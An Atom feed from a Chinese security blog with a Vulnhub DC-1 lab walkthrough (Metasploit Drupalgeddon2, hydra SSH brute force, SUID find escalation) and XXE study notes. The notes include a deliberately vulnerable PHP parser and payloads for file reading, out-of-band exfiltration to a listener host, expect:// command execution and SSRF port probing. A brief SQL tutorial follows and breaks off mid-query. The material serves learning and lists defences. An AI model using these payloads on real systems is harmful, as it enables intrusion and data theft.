<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-06-08T08:14:35.122Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub DC-1靶机渗透学习</title>
    <link href="https://da4er.top/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://da4er.top/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-06-08T08:09:30.000Z</published>
    <updated>2020-06-08T08:14:35.122Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>从<a href="https://www.vulnhub.com/entry/dc-1-1,292/">下载地址</a>中下载DC-1综合渗透靶机，用VMware即可打开，打开时忽略错误，将靶机调成NAT模式即可。</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>打开靶机</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1.png" class title="Da4er"><a id="more"></a><p>发现需要登录账号和密码。<br>用kali进行对局域网的信息收集，将DC-1靶机的ip地址找到。<br>有两个工具可以使用：<br>1.arp-scan</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/2.png" class title="Da4er"><p>扫描到如上ip地址<br>2.nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/3.png" class title="Da4er"><p>经过测试发现到靶机ip：192.168.1.154</p><p>第二步对该ip进行端口扫描工作，使用namp。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.1.154</span><br></pre></td></tr></table></figure><p>使用SYN扫描对其进行端口扫描。</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.png" class title="Da4er"><p>发现80和22端口开放。<br>访问这个靶机，发现一个网页。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/5.png" class title="Da4er"><p>使用Wappalyzer插件 知道这个网页是drupal cms</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.png" class title="Da4er"><p>然后寻找这个cms对应的漏洞，可以使用msf进行查找。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/7.png" class title="Da4er"><p>找到如上漏洞。<br>使用编号为4的漏洞，可以获得一个低权限的shell。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.154</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/8.png" class title="Da4er"><p> 查看文件目录，找到flag1.txt。</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/9.png" class title="Da4er"><p> 根据这个意思说明我们需要找到这个cms对应的配置文件。<br> Google搜索一下：<br> <a href="https://blog.csdn.net/yaojuns/article/details/38084627">https://blog.csdn.net/yaojuns/article/details/38084627</a><br> <img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/10.png" class title="Da4er"></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sites/default/settings.php</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/11.png" class title="Da4er"><p>看到用mysql数据库的用户名和密码，但是无法web端登录，想到通过shell进行。<br>但是不能直接使用msf弹的shell进行，因为权限太低。<br>先cat /etc/passwd</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/12.png" class title="Da4er"><p>发现一个flag4的用户名，想到前面的端口扫描，这个靶机也开放了22端口。<br>那么我们可以进行22端口的暴力破解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/dirb/big.txt ssh://192.168.1.154</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/13.png" class title="Da4er"><p>找到密码为：orange<br>使用ssh进行连接：</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/14.png" class title="Da4er"><p>成功进入，然后进入mysql数据库中进行查看。</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/15.png" class title="Da4er"><p>我们发现有个admin账号，但是密码被加密了。<br>Google搜索drupal密码重置。</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/16.png" class title="Da4er"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> </span><br><span class="line">pass=<span class="string">"$S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4"</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">"admin"</span>;</span><br></pre></td></tr></table></figure><p>成功修改密码，进入admin账号界面。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/17.png" class title="Da4er"><p>这个意思是使用find进行提权，找到root目录下的flag文件。<br>具体参考：<a href="https://blog.csdn.net/qq_36119192/article/details/84872644">SUID提权</a><br>SUID提权简单说就是：当我们运行某个文件或者工具时，就会让我们暂时拥有文件拥有者的身份运行。<br>首先通过find命令查看所有SUID为root的可执行文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/18.png" class title="Da4er"><p>我们可以查看一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -ls /usr/bin/find</span><br></pre></td></tr></table></figure><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/19.png" class title="Da4er"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure><p>上面的意思是查找所有文件 然后执行/bin/sh 用户转换。</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/20.png" class title="Da4er"><p>最终获取最后的flag文件</p><img src="/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/21.png" class title="Da4er"><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>将DC-1靶机打通之后，学到了很多。<br>1.msf的基本使用，以前没怎么接触msf，现在准备好好学习一下。<br>2.nmap端口扫描原理。<br>3.SUID提权，提权以前一点都没有接触到，通过打靶机学习到了一个知识点。</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h3&gt;&lt;p&gt;从&lt;a href=&quot;https://www.vulnhub.com/entry/dc-1-1,292/&quot;&gt;下载地址&lt;/a&gt;中下载DC-1综合渗透靶机，用VMware即可打开，打开时忽略错误，将靶机调成NAT模式即可。&lt;/p&gt;
&lt;h3 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;p&gt;打开靶机&lt;/p&gt;
&lt;img src=&quot;/Vulnhub-DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>XXE学习笔记(持续更新....)</title>
    <link href="https://da4er.top/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-04-22T02:16:43.000Z</published>
    <updated>2020-04-22T02:19:14.670Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>XXE漏洞全称叫做XML外部实体注入漏洞，说白了就是程序中xml可控，而且支持引用外部实体定义DTD从而造成此漏洞。</p><a id="more"></a><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>XML分为三个部分：XML声明，文档类型定义(DTD)，文档元素。</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><p>我们主要来看DTD。<br><strong>DTD作用是定义XML文档的合法构建模块，DTD可以在xml文档内声明，也可以外部引用。</strong><br>内部声明DTD：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>引用外部DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>内部声明实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用外部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。<br><strong>恶意外部引用：</strong><br>一。</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><p>二。</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>DTD文件(evil.dtd)内容：</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><p>三。</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>不同程序支持的协议不一样：</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>PHP支持的扩展协议有：</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><p>一.读取任意文件<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $creds;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM <span class="string">"file:///d:/1.txt"</span>&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><strong>上面代码是post传参，如果是get传参需要url编码一下。</strong></p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>成功读取本地文件内容。</p><p>上面所诉的xxe是回显的，但是在一般情况下xxe是不回显而是用于配置文件。所以我们需要另一种方法：数据外带。<br>原理很简单：就是在一次请求中访问我们自己的vps，而在这个请求之中包含着获取数据的请求.这样就可以让数据回显到我们的vps上。<br>这个有个注意点：<strong>根据规范，我们必须在DTD文件中才能完成”请求中引用另一次的请求的结果”的要求。</strong><br>操作：无回显的XXE<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br></pre></td></tr></table></figure><p>da4er.dtd:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///D:/1.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.1.103:9999?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103/da4er.dtd"</span>&gt;</span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br><span class="line">&lt;convert&gt;%dtd;%int;%send;&lt;/convert&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意几点：<br>1.dtd中send前面的%号要换成html实体编码，因为：实体中不能存在%<br>2.调用逻辑：1.看poc最后一行，首先调用%dtd发送http请求访问192.168.1.103上的da4er.dtd文件；然后调用%int，最后调用%send发送数据到9999端口中。<br>最后成功得到base64加密的数据：</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><p>二。RCE<br>如果PHP安装了expect扩展，是可以执行rce的。<br>这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。当PHP环境中的PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，就会造成我们说的这种情况，在这里，我们不做展开讲解。</p><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"expect://whami"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><p>三。XXE配合SSRF攻击内网<br>看到XXE的攻击姿势我们就应该想到xxe是和ssrf一样，可以对内网进行攻击。其实ssrf算不上一个漏洞而是一种攻击模式。<br>探测端口<br>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:80"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:3305"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><p>发现端口开放和不开放的返回结果不同。<br>xxe还有很多攻击内网的姿势：内网主机探测，钓鱼等。像strust2和内网未授权的redis可以直接getshell</p><h3 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h3><p>1.使用开发语言提供的禁用外部实体的方法<br>php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><p>2.过滤用户提交的XML数据<br>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br>3.不允许XML中含有自己定义的DTD</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;XXE漏洞全称叫做XML外部实体注入漏洞，说白了就是程序中xml可控，而且支持引用外部实体定义DTD从而造成此漏洞。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SQL语句Trick...</title>
    <link href="https://da4er.top/SQL%E8%AF%AD%E5%8F%A5Trick.html"/>
    <id>https://da4er.top/SQL%E8%AF%AD%E5%8F%A5Trick.html</id>
    <published>2020-04-12T12:18:35.000Z</published>
    <updated>2020-04-12T12:23:31.137Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>sql语句对大小写不敏感。</p><h3 id="show语句"><a href="#show语句" class="headerlink" title="show语句"></a>show语句</h3><p>show语句用于展示当前所有数据库或者数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/1.png" class title="This is an test image"><a id="more"></a><h3 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h3><p>语法：<br><code>SELECT 列名称 FROM 表名称</code><br><code>SELECT * FORM 表名称</code><br>星号（*）是选取所有列的快捷方式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/2.png" class title="This is an test image"><h3 id="SELECT-DISTINCT语句"><a href="#SELECT-DISTINCT语句" class="headerlink" title="SELECT DISTINCT语句"></a>SELECT DISTINCT语句</h3><p>语法：<br><code>SELECT DISTINCT 列名称 FROM 表名称</code><br>关键字distinct 意思是去除查询中的重复值。<br>注意点：只能查询单个列才能去除重复值，如下图：<br>当查询id，username两个列名的时候是没有去除的，当只查询username的时候才去除成功。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/3.png" class title="This is an test image"><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/4.png" class title="This is an test image"><h3 id="WHERE子句"><a href="#WHERE子句" class="headerlink" title="WHERE子句"></a>WHERE子句</h3><p>WHERE子句用于规定选择的标准。<br>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句。<br>语法：<br><code>select 列名称 from 表名称 where 列名称 运算符 值</code><br>下面的运算符可在where子句中使用：</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/5.png" class title="This is an test image"><p>在某些版本的 SQL 中，操作符 &lt;&gt; 可以写为 !=。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/6.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> != <span class="number">5</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> &lt;&gt; <span class="number">5</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &lt;&gt; <span class="string">'admin'</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/7.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> 